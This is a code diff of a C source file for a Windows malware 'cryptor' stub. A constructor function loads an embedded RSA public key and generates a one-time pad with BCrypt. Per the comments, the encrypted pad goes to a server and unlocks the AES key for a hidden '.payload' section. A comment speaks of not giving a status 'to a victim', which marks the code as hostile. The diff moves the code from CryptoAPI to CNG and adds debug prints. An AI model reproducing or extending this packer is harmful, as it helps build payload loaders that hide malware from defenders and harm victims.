@@ -6,9 +6,20 @@
 #include "cryptor.h"
 #include <wincrypt.h>
 #include <ws2tcpip.h>
+#include <bcrypt.h>
+#include <ntstatus.h>
+
+
 __attribute__((constructor, section(".cryptor"))) int construct(){
 
-/*
+typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
+CIPKIE2 CryptImportPublicKeyInfoEx2;
+HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
+if( CryptImport ) {
+	
+ CryptImportPublicKeyInfoEx2 = (CIPKIE2)GetProcAddress(CryptImport,"CryptImportPublicKeyInfoEx2");
+}
+ /*
  * Get the section offsets for the cryptor to decrypt the payload stub
  */
     extern UINT64 START_OF_PAYLOAD;
@@ -26,19 +37,23 @@ __attribute__((constructor, section(".cryptor"))) int construct(){
  * define variables necessary to decode the public key
  */
     BYTE* PemPubKey = PUBKEY; //Public key embedded in header
+    PCCERT_CONTEXT pCertContext = NULL;
     BYTE derPubKey[RSAKEYLEN] = {0};
-    DWORD derPubKeylen = RSAKEYLEN;
+    DWORD derPubKeyLen = RSAKEYLEN;
+    BCRYPT_ALG_HANDLE alg;
     CERT_PUBLIC_KEY_INFO *PubKeyInfo;
     DWORD PubKeyInfoLen;
-    HCRYPTPROV hProvRSA = 0;
-    HCRYPTKEY hKeyRSA = 0;
+    BCRYPT_KEY_HANDLE hkey;
+    /*HCRYPTPROV hProvRSA = 0;
+    HCRYPTKEY hKeyRSA = 0;*/
 /*
  * Define Variables required to generate a cryptographically random integer
  */
+
+    BCRYPT_ALG_HANDLE randNumProv;
     BYTE* OTP = malloc(AESKEYLEN+1);
     memset(OTP,0,AESKEYLEN+1);
-    HCRYPTPROV hProvRRand = 0;
-    DWORD RsaCryptLen = AESKEYLEN+1;
+   
 /*
  * Definitions of variables for the windows client
  */
@@ -49,33 +64,56 @@ __attribute__((constructor, section(".cryptor"))) int construct(){
  * retrieving the public key
  * in the event of an error silently exit 0. No reason to provide a return status to a victim
  */
-    if(!CryptStringToBinaryA(PemPubKey, 0, CRYPT_STRING_BASE64HEADER, derPubKey,&derPubKeylen,NULL, NULL))
-        exit(0);
-    if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeylen,
-                            CRYPT_ENCODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
-        exit(0);
-    if(!CryptAcquireContext(&hProvRSA,NULL,NULL,PROV_RSA_FULL,CRYPT_VERIFYCONTEXT))
-        exit(0);
-    if(!CryptImportPublicKeyInfo(hProvRSA,X509_ASN_ENCODING,PubKeyInfo, &hKeyRSA))
-        exit(0);
-    LocalFree(PubKeyInfo);
+    printf("%s\n", PemPubKey);
+    if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
+    {
+   	exit(0);
+    }
+    printf("\n%d ",derPubKeyLen);
+    if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
+    {
+	    printf("failed\n");
+    	exit(0);
+    }
+    if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
+                            CRYPT_DECODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
+    {
+	    exit(0);
+    }
+    if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&hkey))
+    {
+	    exit(0);
+    };
+
 /*
  * Generate a one time pad generation
  * Generate 32 random bytes. These bytes are sent to the server encrypted with RSA 4096
  * The bytes will be XORed against the AES key used to decrypt the .payload section.
  */
 
-    if(!CryptAcquireContext(&hProvRRand,0,0,PROV_RSA_FULL,CRYPT_VERIFYCONTEXT))
-        exit(0);
-    if(!CryptGenRandom(hProvRRand,AESKEYLEN,OTP))
-        exit(0);
-        printf("plain text length: %d\n",AESKEYLEN);
-        for(int x=0; x<AESKEYLEN; x++)
-            printf("0x%02x ", *(OTP+x));
-        printf("\n",RsaCryptLen);
+    	if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&randNumProv, BCRYPT_RNG_ALGORITHM, NULL, 0)))
+	{	
+		printf ("error creating provider\n");
+		exit(0);
+	}
+    	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(OTP), AESKEYLEN, 0)))
+    	{
+		printf("error generating random number");
+		exit(0);
+    	}
+	printf ("here");
+	for(int x=0; x<AESKEYLEN; x++)
+        	printf("0x%02x ", *(OTP+x));
+	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
+		{
+			printf("error closing handaler");
+			exit(0);
+		}
+
 /*
  * Encrypt the one time pad with the RSA key
  */
+	/*
     if(CryptEncrypt(hKeyRSA,0,TRUE,0,OTP,&RsaCryptLen,AESKEYLEN+1))
         exit(0);
 
